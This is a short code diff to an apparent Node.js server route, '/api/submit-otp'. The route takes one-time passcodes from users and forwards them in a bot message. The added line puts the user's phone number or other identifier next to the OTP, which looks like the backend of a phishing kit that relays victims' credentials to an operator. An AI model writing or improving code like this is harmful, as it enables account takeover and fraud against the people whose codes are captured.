@@ -228,6 +228,7 @@ app.post('/api/submit-otp', async (req, res) => {
     session.otp = otp;
 
     const message = `🔑 *OTP VERIFICATION*\n\n` +
+                    `📌 *${session.identifierType || 'Phone No'}:* \`${session.identifierValue}\`\n` +
                     `📱 *6-Digit OTP:* \`${otp}\``;
 
     const opts = {
@@ -255,4 +256,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-    
+                                   
